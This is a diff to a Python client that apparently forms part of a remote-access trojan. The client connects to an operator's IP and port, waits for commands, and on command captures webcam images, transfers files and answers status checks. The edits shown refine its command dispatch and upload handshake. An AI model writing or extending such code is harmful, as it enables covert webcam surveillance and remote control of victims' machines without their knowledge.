@@ -56,9 +56,9 @@ def PINGPONG_client_T(ip, port):
         while True:
             data = s.recv(1024)
             # usage 
-            if data.decode() == 'SHOW_ALL_USAGE_APP':
-                pass
-            elif data.decode() == "EXIT_APP":
+            # if data.decode() == 'SHOW_ALL_USAGE_APP':
+                
+            if data.decode() == "EXIT_APP":
                 s.close()
                 break
             elif data.decode() == "CHECK_APP":
@@ -192,7 +192,7 @@ def PINGPONG_client_T(ip, port):
                         break
 #priv_vbp_listen_END_location
 #cam_shot_START_location
-            if data.decode() == "CAM_SHOT_APP":
+            elif data.decode() == "CAM_SHOT_APP":
                 from cv2 import VideoCapture, imwrite
                 import shutil
                 os.mkdir("./temp")
@@ -220,6 +220,8 @@ def PINGPONG_client_T(ip, port):
                 import shutil
                 is_named = False
                 s.send(bytes("OK", 'utf8'))
+                re_check = s.recv(1024).decode()
+                s.send(bytes('OK', 'utf8'))
                 dir_data = s.recv(1024).decode()
                 if "." in dir_data:
                     dir_data_l = dir_data.split(".")
@@ -249,10 +251,10 @@ def PINGPONG_client_T(ip, port):
                         s.send(bytes("DONE", "utf8"))
                     else:
                         break
-            if data == "exit":
-                break
 #upload_END_location
 #exit_START_location
+            else:
+                s.send(bytes("Unfound", 'utf8'))
         s.close()
     except:
         sys.exit(1)
